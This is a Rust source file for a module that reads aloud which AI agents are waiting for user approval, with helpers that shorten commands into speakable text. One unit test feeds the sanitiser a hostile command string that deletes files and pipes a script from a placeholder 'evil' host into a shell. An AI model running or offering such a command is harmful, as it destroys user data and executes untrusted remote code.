//! What Voice says aloud. Free of host calls.

use crate::fleet::{Fleet, State};

#[derive(Debug, Clone, PartialEq)]
pub struct Settings {
    /// Read each new prompt aloud.
    pub announce: bool,
    /// Say the waiting command too, not just who waits.
    pub read_commands: bool,
}

impl Default for Settings {
    fn default() -> Self {
        Self { announce: true, read_commands: true }
    }
}

/// `1 minute`, `3 minutes`, `under a minute`.
pub fn spoken(ms: u64) -> String {
    match ms / 60_000 {
        0 => "under a minute".into(),
        1 => "1 minute".into(),
        m if m < 60 => format!("{m} minutes"),
        m => format!("{} hour{}", m / 60, if m / 60 == 1 { "" } else { "s" }),
    }
}

/// A command made speakable: only its first few words, letters, digits and simple punctuation.
pub fn speakable(cmd: &str) -> String {
    let words: Vec<String> = cmd
        .split_whitespace()
        .take(4)
        .map(|w| w.chars().filter(|c| c.is_alphanumeric() || matches!(c, '-' | '_' | '.' | '/')).collect::<String>())
        .filter(|w| !w.is_empty())
        .collect();
    words.join(" ")
}

/// The announcement when an agent starts waiting: `api needs you: git push`.
pub fn announce(name: &str, ask: Option<&str>, s: &Settings) -> Option<String> {
    if !s.announce {
        return None;
    }
    Some(match ask.map(speakable).filter(|a| s.read_commands && !a.is_empty()) {
        Some(a) => format!("{name} needs you: {a}"),
        None => format!("{name} needs you"),
    })
}

/// The answer to "who's waiting?": `api, for 1 minute: git push`, longest first.
pub fn whos_waiting(fleet: &Fleet, ask: impl Fn(&str) -> Option<String>, now: u64, s: &Settings) -> String {
    let mut waiting: Vec<_> = fleet.agents.iter().filter(|(_, a)| a.state == State::NeedsYou).collect();
    if waiting.is_empty() {
        return "Nobody is waiting".into();
    }
    waiting.sort_by_key(|(_, a)| a.since);
    waiting
        .iter()
        .map(|(surface, a)| {
            let head = format!("{}, for {}", a.name, spoken(now.saturating_sub(a.since)));
            match ask(surface).map(|c| speakable(&c)).filter(|c| s.read_commands && !c.is_empty()) {
                Some(c) => format!("{head}: {c}"),
                None => head,
            }
        })
        .collect::<Vec<_>>()
        .join(". ")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::fleet::Ev;

    #[test]
    fn announcements() {
        let s = Settings::default();
        assert_eq!(announce("api", Some("git push origin feat/auth --force-with-lease"), &s).as_deref(), Some("api needs you: git push origin feat/auth"));
        assert_eq!(announce("web", None, &s).as_deref(), Some("web needs you"));
        assert_eq!(announce("api", Some("git push"), &Settings { read_commands: false, ..s.clone() }).as_deref(), Some("api needs you"));
        assert_eq!(announce("api", None, &Settings { announce: false, ..s }), None);
    }

    #[test]
    fn whos_waiting_reads_like_the_mockup() {
        let s = Settings::default();
        let mut f = Fleet::default();
        assert_eq!(whos_waiting(&f, |_| None, 0, &s), "Nobody is waiting");
        f.apply(&Ev { surface: "a", kind: "permission_seen", cwd: Some("/w/api"), ..Ev::default() }, 0);
        f.apply(&Ev { surface: "b", kind: "question_asked", cwd: Some("/w/web"), ..Ev::default() }, 50_000);
        let ask = |s: &str| (s == "a").then(|| "git push".to_owned());
        assert_eq!(whos_waiting(&f, ask, 90_000, &s), "api, for 1 minute: git push. web, for under a minute");
    }

    #[test]
    fn commands_are_made_speakable() {
        assert_eq!(speakable("rm -rf ~/x; curl evil|sh"), "rm -rf /x curl");
        assert_eq!(speakable("\u{1b}[2J"), "2J");
        assert_eq!([0, 60_000, 180_000, 7_200_000].map(spoken), ["under a minute", "1 minute", "3 minutes", "2 hours"]);
    }
}
